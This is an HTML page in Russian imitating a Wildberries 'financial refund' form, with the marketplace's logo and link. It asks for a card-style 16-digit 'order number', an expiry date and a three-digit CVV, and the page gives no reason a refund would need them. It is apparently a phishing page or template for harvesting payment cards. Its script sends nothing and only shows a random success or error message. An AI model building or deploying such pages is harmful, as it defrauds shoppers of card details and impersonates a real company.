<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Финансовый возврат</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f7f7f7;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
    }

    header {
      width: 100%;
      background: #9b4dca;
      position: sticky;
      top: 0;
      z-index: 10;
      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
      text-align: center;
    }

    header .logo-link {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      color: white;
      text-decoration: none;
      font-size: 26px;
      font-weight: bold;
      padding: 18px;
      cursor: pointer;
    }

    header .logo-link img {
      height: 32px;
      width: 32px;
    }

    .container {
      background: #fff;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(0,0,0,0.15);
      width: 100%;
      max-width: 600px;
      text-align: center;
      box-sizing: border-box;
      margin: 30px auto;
      min-height: 70vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      opacity: 0;
      transform: scale(0.9);
      animation: fadeInScale 0.6s ease forwards;
    }

    @keyframes fadeInScale {
      from { opacity: 0; transform: scale(0.9); }
      to { opacity: 1; transform: scale(1); }
    }

    .container h2 {
      color: #9b4dca;
      margin-bottom: 20px;
      font-size: 24px;
    }

    input, textarea, select {
      width: 100%;
      padding: 14px;
      margin: 12px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
      box-sizing: border-box;
    }

    textarea {
      resize: vertical;
      min-height: 80px;
    }

    button {
      width: 100%;
      padding: 14px;
      background: #9b4dca;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 18px;
      cursor: pointer;
      transition: 0.2s;
    }

    button:hover { background: #7a3ca3; }
    button:active { transform: scale(0.95); }

    .row {
      display: flex;
      gap: 10px;
    }

    .row input {
      flex: 1;
      width: auto; /* чтобы не падали вниз на телефонах */
    }

    .message { margin-top: 12px; font-size: 15px; font-weight: bold; }
    .error { color: red; }
    .success { color: green; }

    @media (max-width: 600px) {
      header .logo-link { font-size: 22px; padding: 14px; gap: 8px; }
      header .logo-link img { height: 26px; width: 26px; }
      .container { max-width: 95%; padding: 20px; min-height: 80vh; }
      .container h2 { font-size: 22px; }
      input, textarea, select { font-size: 16px; padding: 14px; }
      button { font-size: 18px; padding: 14px; }
      .row input { width: auto; }
    }
  </style>
</head>
<body>
  <header>
    <a href="https://www.wildberries.ru/" target="_blank" class="logo-link">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5a/Wildberries_logo.svg/512px-Wildberries_logo.svg.png" alt="logo">
      <span>WILDBERRIES</span>
    </a>
  </header>

  <div class="container">
    <h2>Финансовый возврат</h2>
    <form id="refundForm">
      <input type="text" id="orderNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>

      <div class="row">
        <input type="text" placeholder="00 / 00" maxlength="5" required>
        <input type="text" placeholder="000" maxlength="3" required>
      </div>

      <select required>
        <option value="">Причина возврата</option>
        <option>Товар не подошёл</option>
        <option>Брак или повреждение</option>
        <option>Ошибка при заказе</option>
      </select>
      <textarea placeholder="Комментарий (по желанию)"></textarea>
      <button type="submit">Отправить запрос</button>
    </form>
    <p class="message" id="formMessage"></p>
  </div>

  <script>
    const orderInput = document.getElementById('orderNumber');

    orderInput.addEventListener('input', function(e) {
      let value = e.target.value.replace(/\D/g, '');
      value = value.substring(0,16);
      const parts = value.match(/.{1,4}/g);
      e.target.value = parts ? parts.join(' ') : '';
    });

    const form = document.getElementById('refundForm');
    const formMessage = document.getElementById('formMessage');

    form.addEventListener('submit', function(event) {
      event.preventDefault();

      const success = Math.random() > 0.3;

      if (success) {
        formMessage.textContent = "✅ Заявка принята! Мы свяжемся с вами.";
        formMessage.className = "message success";
        form.reset();
      } else {
        formMessage.textContent = "❌ Ошибка! Попробуйте ещё раз позже.";
        formMessage.className = "message error";
      }
    });
  </script>
</body>
</html>
